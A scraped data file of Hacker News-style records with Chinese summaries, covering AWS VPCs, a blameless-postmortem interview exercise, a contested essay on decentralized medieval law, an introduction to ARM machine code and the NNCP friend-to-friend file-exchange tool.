. That way, they could bring their IP addresses with them, and they wouldn't conflict with anyone else's IP addresses.
Maybe you're wondering, "why can't we just change the IP addresses so all machines have a unique IP address?" Well, in networking, you set up some things based around specific IP addresses (I'll get to exactly what stuff later), so that idea would require a lot of work in practice.
Separate networks would also solve the security problem.
This is the big idea behind a VPC: everyone gets their own private network inside AWS.

data.title: Writing a postmortem: an interview exercise I like (2017)
data.author: wonger_
data.article_summary: Dan Puttick分享了他对Mapbox面试过程中一个练习的喜爱：撰写无责验尸报告。这一练习不仅考察了候选人的技术写作能力，还评估了他们从多角度思考问题、表达同理心以及进行逻辑分析的能力。无责验尸报告强调避免责备个人，而是通过分析过程缺陷来找出根本原因，以防止问题重现。这种写作练习在工作中非常常见，涉及文档、邮件、设计文档等，因此清晰、简洁的写作能力对程序员至关重要。此外，撰写报告需要理解和考虑所有相关人员的视角和动机，展示了候选人的同理心和批判性思维能力。Dan认为这是一个很好的面试题目，能全面评估工程师的多项素质。他在面试中选择了一件个人经历的意外事件来撰写报告，并认为这是了解Mapbox面试流程独特之处的良好方式。
data.comments_summary:
主要讨论点：通过分析失败项目或事故来学习和改进的过程，特别是在讨论责任和改进措施时应保持无责备的态度。

不同观点：
• beneboy：支持在面试中让候选人讲述未按计划进行的项目，以了解他们的真实思维方式和系统性失败的认识。认为个人经历可以提供更深入的见解。
• spankibalt：强调无责备事后分析的重要性，认为不应将问题归咎于个人，而应着眼于改进流程。例如，不应说“Dan写了bug”，而应说“我们需要改进测试和部署流程”。
• voidUpdate：将讨论与NTSB（美国国家运输安全委员会）的报告类比，指出即使在个人明显有责任的情况下，报告仍会关注于改进培训和测试标准，而不是责备个人。
• Romario77：提出在事故中应考虑更多的缓解措施，例如根据风力增加调整帆的角度或使用引擎动力，强调在事故预防中适应变化和保持安全性的重要性。

补充讨论：
• pickpuck：最初认为活动是提供信息并实时提出改进建议，显示出对无责备分析的另一种理解方式，即时处理信息并提出实用改进建议。

争议焦点：
• 讨论的核心在于如何在分析失败时避免个人责备，同时专注于系统性改进。不同参与者通过实际例子和类比强调了无责备分析的必要性和实际应用。

44144299.article_content:
Dan Puttick
Writing a postmortem: an interview exercise I really like
2017-10-31
First, some exciting news that’s relevant as context: starting in November, I’ll be joining
Mapbox
in their Washington,
DC
office. One thing that made me excited about joining Mapbox was how much I enjoyed their
interview process
. No part of it felt like it required extra “preparation” and it was clear that some significant thought had been put into its design. In my opinion, this is a pretty useful signal about an engineering organization. If we accept that finding great engineers (by whatever definition of “great” you subscribe to) is one of the largest contributors to the success of any company, it’s possible that a company with an interview process that appears disorganized or nonsensical is otherwise well-functioning, but it’s probably at least somewhat less likely.
One aspect of the Mapbox interview process that I particularly liked was their request that I write a blameless postmortem as a take-home exercise. If the term is unfamiliar, postmortems are a tool designed to help facilitate a culture of building institutional knowledge and learning from the past. Whenever something goes wrong – an outage, bug in production, failure to meet an
SLA
, etc – anybody involved in the situation can call for a postmortem. The postmortem takes the form of a shared document where everybody can contribute their account of the incident to help identify its ultimate causes and propose changes to prevent it from happening again. The “blameless” aspect is crucial: a good postmortem avoids conclusions like “Dan wrote a bug and it brought down our service” and instead says “Dan wrote a bug and it brought down the service: we need to improve our testing and deployment processes to make sure that they catch this category of bugs in the future.” For many mistakes that initially look like they ought to be blamed on an individual, it’s possible to identify a deficiency in a process as the root cause. You can read more about blameless postmortems in the
Google
SRE
book
.
I thought this exercise was a great interview question because it lets the reader learn more about several different attributes that one might associate with good programmers:
It’s a sample of the type of written communication you’ll be doing frequently in a work environment. Between documentation, taking notes while working, design documents, commit messages, chat, and email, programmers can produce significantly more prose than  code. Being able to express technical concepts clearly, unambiguously, and succinctly is essential. I may be wrong, but I sometimes get the feeling that this is widely acknowledged, but without the accompanying recognition that writing is a skill that can be improved relatively easily. Producing excellent writing might take a lot of work, but learning to write
decently
isn’t that different from improving as a programmer: it takes building up experience, practicing deliberately, taking the time to revise repeatedly, and getting constructive feedback.
It’s a great way for the writer to demonstrate their ability to assume the perspective of others. So much of being a good engineer is having empathy for your users and the other programmers who will read, modify, or interact with your code. Writing a useful postmortem necessarily requires empathy, because you have to put yourself in the shoes of everybody involved in the incident and understand what they were thinking and why they took the actions they did.
It helps assess the writer’s ability to think critically and logically about a complex chain of events. Imagining all possible contributing factors to an incident and identifying the various links of causality is the same type of thinking as is required when trying to think of edge cases or identify the tradeoffs and compromises in a system’s design. Finding ultimate rather than proximate causes, dismissing alternate explanations, and considering counterfactuals are all closely related to the type of critical thinking involved in debugging software or troubleshooting systems.
When I sat down to write my postmortem, I wasn’t sure whether to analyze a programming-related incident or choose something else. The instructions said the postmortem could be about anything I liked, and I decided it might be fun to write about a certain eventful and unusual accident that happened to me a few years ago. What I wrote is definitely not perfect, it’s just one example, and there’s no one “right” way to format or organize a postmortem. Anyway, I’m excited about the new job, and feel free to reach out if you’re curious about the Mapbox hiring process or what it’s like to work there (you should probably give me some time after I’ve started for the latter). I chose this incident by thinking, “what’s the most memorable unfortunate thing that I’ve been involved in over the past few years?” For context, in 2014 I
44144299.article_summary: Dan Puttick分享了他对Mapbox面试过程中一个练习的喜爱：撰写无责验尸报告。这一练习不仅考察了候选人的技术写作能力，还评估了他们从多角度思考问题、表达同理心以及进行逻辑分析的能力。无责验尸报告强调避免责备个人，而是通过分析过程缺陷来找出根本原因，以防止问题重现。这种写作练习在工作中非常常见，涉及文档、邮件、设计文档等，因此清晰、简洁的写作能力对程序员至关重要。此外，撰写报告需要理解和考虑所有相关人员的视角和动机，展示了候选人的同理心和批判性思维能力。Dan认为这是一个很好的面试题目，能全面评估工程师的多项素质。他在面试中选择了一件个人经历的意外事件来撰写报告，并认为这是了解Mapbox面试流程独特之处的良好方式。

主要讨论点：通过分析失败项目或事故来学习和改进的过程，特别是在讨论责任和改进措施时应保持无责备的态度。

不同观点：
• beneboy：支持在面试中让候选人讲述未按计划进行的项目，以了解他们的真实思维方式和系统性失败的认识。认为个人经历可以提供更深入的见解。
• spankibalt：强调无责备事后分析的重要性，认为不应将问题归咎于个人，而应着眼于改进流程。例如，不应说“Dan写了bug”，而应说“我们需要改进测试和部署流程”。
• voidUpdate：将讨论与NTSB（美国国家运输安全委员会）的报告类比，指出即使在个人明显有责任的情况下，报告仍会关注于改进培训和测试标准，而不是责备个人。
• Romario77：提出在事故中应考虑更多的缓解措施，例如根据风力增加调整帆的角度或使用引擎动力，强调在事故预防中适应变化和保持安全性的重要性。

补充讨论：
• pickpuck：最初认为活动是提供信息并实时提出改进建议，显示出对无责备分析的另一种理解方式，即时处理信息并提出实用改进建议。

争议焦点：
• 讨论的核心在于如何在分析失败时避免个人责备，同时专注于系统性改进。不同参与者通过实际例子和类比强调了无责备分析的必要性和实际应用。

data.title: Decentralization Hidden in the Dark Ages
data.author: palmfacehn
data.article_summary: 本文简要探讨了中世纪的分权社会，特别是后罗马时期欧洲的治理模式，挑战了“黑暗时代”的刻板印象。作者指出，中世纪的法律基于地方传统和文化，国王也需遵守法律，无权单方面更改。每个自由人对自己土地拥有主权，税收是自愿的。国王的合法性来自民众的同意，而非世袭或神权。此时的社会以法律为最高准则，国王与贵族都有责任维护法律。与现代政府不同，当时贵族有义务抵制超越权限的国王。作者引用Hans-Hermann Hoppe和Fritz Kern的观点，强调中世纪的法律至上原则，与后来的专制主义形成对比。
data.comments_summary:
主要讨论点：中世纪社会的权力结构、历史记录的缺乏与解释、现代法律与社会制度的反思

不同观点：
• oldjim69：认为文章中的许多事实没有证据支持，尤其是关于威廉征服者之后的土地所有权变化。他指出，国王通过征服宣称土地所有权在当时并不新奇，许多国王都这样做。此外，中世纪的权力分散主要是由于交通和通信困难，而不是文章所说的原因。
• TSiege：同意文章缺乏真实历史基础，推荐了一个关于中世纪欧洲农民反抗与抵抗的播客，强调了普通人在历史中的作用。
• hosh：通过引用Frankopan的《丝绸之路》提出，罗马帝国的衰落与对丝绸之路的关注有关，并且在此时期，奴隶贸易和贡赋制度（如农奴制）是权力分散的基础。
• pcaharrier：对现代宪法形式提出了质疑，认为其在保护人民免受君主行为影响方面做得不够，反而保护了君主免受人民影响。
• GuB-42：解释“黑暗时代”中的“黑暗”更多是指历史记录的缺乏，而不是指生活的艰难或邪恶。
• lou1306：反驳文章关于中世纪缺乏记录的观点，指出在7世纪已经有法律代码存留，并且中世纪的权力分散是众所周知的，甚至有相关电子游戏。
• rmah：批评文章充满了无证据的猜测，指出中世纪时期的国家机构和法律体系与现代不同，税收和租金是同义词，且“土地所有者”一词由此而来。
• jongjong：支持文章关于法律与伦理脱节的观点，批评现代法律体系中的漏洞和有限责任公司等概念，认为现代社会建立在空虚的表面概念之上。
• rimbo789：简短评论认为每个统治者如果有手段都会像斯大林一样集中权力。
• dunkeltaenzer：从神秘主义和历史文化演变的角度分析中世纪的权力结构变化，提出巫术迫害和宗教裁判所是中央集权化的表现，并探讨了文化创伤和历史记忆对现代社会的影响。

补充讨论：
• 争议的焦点在于中世纪社会的权力分散原因以及历史记录的缺乏是否如文章所述。oldjim69和lou1306提供了历史证据反驳文章的观点，而hosh和rimbo789则从不同角度支持权力集中和分散的解释。
• 另一个值得注意的讨论点是现代法律体系与中世纪法律体系的比较，jongjong和pcaharrier对现代法律体系提出了批评，认为其缺乏伦理基础和透明度。
• dunkeltaenzer的评论提供了一种神秘主义和文化演变的视角，虽然与其他评论的实证角度不同，但丰富了讨论的深度和广度。

44177797.article_content:
For longtime readers, this is a condensed version of the
several posts I have made on this subject.
I have also added a minor amount of new material.
Examples of decentralized society in history are often hidden.
They are hidden because those in
decentralized societies never bothered to keep records.
They are also hidden for the purposes of the
current state.
I have previously written
about
anarchy
in the Southeast Asian Highlands
as one example.
Here, I will present the time of the Middle
Ages as another.
This time offered a system of private law.
A law not based on the edicts of the king, but
based on local tradition and culture.
The
king was not above the law, but equally subject to it.
For law to be law, it must be both old and
good.
Each lord had a veto power over
the king and over each other law (I will use the term “lord” for those landed
free men.
Even the serfs could not be denied
their right without adjudication.
Land
was not held as a favor from the king; title was allodial.
A man’s home truly was his castle.
Although the term has fallen out of use in the academic
community, for many this period is known as the Dark Ages – with all of the associated
stereotypes: barbarians, boorish behavior, and the uncivilized society that
came to Europe with the fall of the much more civilized Rome.
From
Wikipedia
:
The Dark Ages is a historical
period used for the first part of the Middle Ages. The term emphasizes the
cultural and economic deterioration that supposedly occurred in Europe
following the decline of the Roman Empire.
The label employs traditional
light-versus-darkness imagery to contrast the "darkness" of the
period with earlier and later periods of "light".
The (Not So) Dark Ages
How
did people live absent a strong central power (Rome)?
In what manners was governance achieved?
How did such a society evolve over the centuries
into the nation-states of Europe?
From
whose perspective were these ages “dark”?
Hans-Hermann
Hoppe, in
his essay entitled
“On the Impossibility of
Limited Government and the Prospects for a Second American Revolution,” makes
reference to certain aspects of this time period in history:
Feudal lords and kings did not typically fulfill the
requirements of a state; they could only "tax" with the consent of
the taxed, and on his own land every free man was as much a sovereign (ultimate
decision maker) as the feudal king was on his.
Tax payments
were voluntary.
On his land, each free
man was as sovereign as the king.
This
doesn’t seem so “dark.”
Hoppe
quotes Robert Nisbet:
The subordination of king to law was one of the most
important of principles under feudalism.
The
king was below the law.
This might be
one factor as to why the time period is kept “dark.”
Hoppe
references a book by Fritz Kern, “
Kingship and Law in the Middle
Ages
.”
The book was originally written in German in
1914, and is a thorough and eye-opening examination of the relationship of king
and lord during this time period, as well as the relationship of both king and lord
to the law.
I will rely upon, and will
quote extensively, from this book throughout this essay.
Except as noted, all quoted items will be
from this book.
During
the early Middle Ages, there was no concept of a Divine Right of Kings, nor did
the earlier period hold to the idea of kingship by birthright.
These ideas developed over the centuries and
only took shape in the late Middle Ages.
Contrary to these, in the early Middle Ages…
…an act of popular will was an essential element in the
foundation of government….
To
become king required consent of those doing the choosing.
Additionally, the king did not hold absolute
power:
…even the rudiments of an absolutist doctrine had scarcely
appeared.
Both
the king and the people were subservient to the law – and not an arbitrary law,
but a law based on custom, “the laws of one’s fathers.”
All well-founded private rights were protected from
arbitrary change….
Germanic and ecclesiastical opinion were firmly agreed on
the principle, which met with no opposition until the age of Machiavelli, that
the State exists for the realization of the Law; the power of the State is the
means, the Law is the end-in-itself; the monarch is dependent on the Law, which
is superior to him, and upon which his own existence is based.
The
king and the people were not bound to each other, but each was bound to the
Law, giving all parties responsibility to see that the integrity of the Law is
maintained.
A breech by one imposed an
obligation on the other to correct the breech.
The relationship of each party (king and lord) was to the Law, not to
the other party, and each had duty to protect it.
Contrast
this to the situation today: whereas today it is an illegal act for the people
to resist the government authority, during this period after the fall of Rome
the lords had a duty to resist the king who overstepped his authority.
This is not to say that such challenges went
unopposed by the king –physical enforcement by the lords wa

data.title: Machine Code Isn't Scary
data.author: surprisetalk
data.article_summary: 本文介绍了机器码并消除其神秘感。作者从学习高层次编程语言开始，逐渐克服对低层次编程的恐惧，特别是机器码。文章解释了机器码的基本概念，包括指令、寄存器和内存，并以ARM 64位架构为例，展示了如何理解和编写简单的机器码指令。机器码指令是32位数字，包含操作类型和参数。通过具体例子，如“添加立即数”指令，文章展示了如何操作这些二进制数。寄存器用于存储值，不同的处理器架构有不同的寄存器数量和命名规则。虽然手写二进制机器码繁琐，但理解其结构有助于消除对机器码的恐惧。文章最后提到，掌握JSON模式验证的人同样能理解和编写机器码。

Jimmy Miller
Machine Code Isn't Scary
The first programming language I ever learned was ActionScript. Writing code for Macromedia's Flash might be the furthest away from "bare metal" as you can possibly get. As I continued learning new languages, this starting heritage stuck with me. I was mostly interested in high-level, "web languages". Low-level languages felt impenetrable. Over time, I learned a bit more about them here and there, but for some reason, this notion stuck with me. Low-level things are scary, and machine code epitomized that most directly. When I Googled things asking about writing in "straight machine code", I was met with discouraging messages rather than learning.
Eventually, I decided I needed to overcome this barrier if I was going to achieve my goals. In doing so, I learned something I didn't expect.
Machine code isn't scary. If you can make sure your JSON conforms to a JSON schema, you can write machine code.
Which Machine Code?
One problem with machine code is that there isn't simply one standard. There are many different "instruction sets" depending on the processor. Most modern PCs use x86-64 machine code, but newer Macs, Raspberry Pis, and most mobile devices use ARM. There are other architectures out there, especially as you go back in time. The goal of this article won't be to give you a deep understanding of any particular instruction set, but instead, to give you enough information about how machine code typically works so you cannot be afraid of machine code. So we will start by having our examples be in ARM 64-bit (also written as aarch64). Once we have a decent understanding of that, we will talk a bit about x86-64.
Machine Code Basics
To understand the basics of machine code, you need three concepts:
Instructions
Registers
Memory
Instructions are exactly what they sound like; they are the code that will run. Machine code instructions are just numbers. In fact, in AArch64, every instruction is a 32-bit number. Instructions encode what operation the machine should run (add, move, subtract, jump, etc.) and accept some arguments for what data to operate on. These arguments might be constants (meaning like the number 2; these constants are often called "immediates"), but they can also be registers or a memory address. For now, just think of a register as a variable and memory as a list.

If the value is a 0 or 1, that just means it is already filled in. If it has a label, it is a variable that needs to be filled in.

44177446.article_summary: 本文介绍了机器码并消除其神秘感。作者从学习高层次编程语言开始，逐渐克服对低层次编程的恐惧，特别是机器码。文章解释了机器码的基本概念，包括指令、寄存器和内存，并以ARM 64位架构为例，展示了如何理解和编写简单的机器码指令。机器码指令是32位数字，包含操作类型和参数。通过具体例子，如“添加立即数”指令，文章展示了如何操作这些二进制数。寄存器用于存储值，不同的处理器架构有不同的寄存器数量和命名规则。虽然手写二进制机器码繁琐，但理解其结构有助于消除对机器码的恐惧。文章最后提到，掌握JSON模式验证的人同样能理解和编写机器码。

data.title: Nncp: Ad-hoc friend-to-friend delay-tolerant sneakernet-compatible darknet
data.author: gasull
data.article_summary: NNCP（Node to Node Copy）是一组简化安全存储转发文件、邮件和命令交换的工具，旨在帮助构建小型（几十个节点）的朋友对朋友（F2F）、静态路由、延迟容忍的暗网网络。它支持完整性检查、端到端加密、公钥认证和洋葱加密，每个节点同时作为客户端和服务器运行，支持推送和轮询模式，并支持多播区域。NNCP还支持离线传输、不同存储介质及空气隔离计算机，但也提供在线TCP守护进程。其优势在于简化、加密安全、兼容Sneakernet并易于与现有SMTP服务器集成，是基于GNU GPLv3的自由软件，适用于所有POSIX系统。
